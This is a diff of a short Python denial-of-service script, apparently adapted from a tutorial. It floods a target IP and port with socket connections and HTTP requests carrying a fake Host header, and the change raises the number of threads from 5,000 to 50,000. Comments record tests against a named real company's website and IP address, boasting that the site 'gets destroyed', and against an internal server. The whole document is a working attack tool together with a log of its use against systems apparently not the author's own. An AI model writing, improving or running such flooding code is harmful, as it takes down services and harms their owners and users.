@@ -1,12 +1,12 @@
 # https://www.neuralnine.com/code-a-ddos-script-in-python/
-# TESTED ON WWW.SUPACRETE.CO.NZ PORT: 80
-# OR 49.50.246.83:80
+# 10.1.1.202:80 - OPTIBATCH Server(Quite resiliant, seems to bounce back easily)
+# 49.50.246.83:80 - www.supacrete.co.nz(Gets fucking destroyed)
 
 import socket
 import threading
 
 target = input("Enter target ip: ")
-fake_ip = "125.245.192.66"
+fake_ip = "125.47.192.66"
 port = int(input("Enter target port: "))
 
 attack_num = 0
@@ -19,9 +19,10 @@ def attack():
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         global attack_num
         attack_num += 1
-        print("Packets Sent: ", attack_num)
+        print(attack_num)
         s.close()
         
-for i in range(5000):
+for i in range(50000):
     thread = threading.Thread(target=attack)
     thread.start()
+
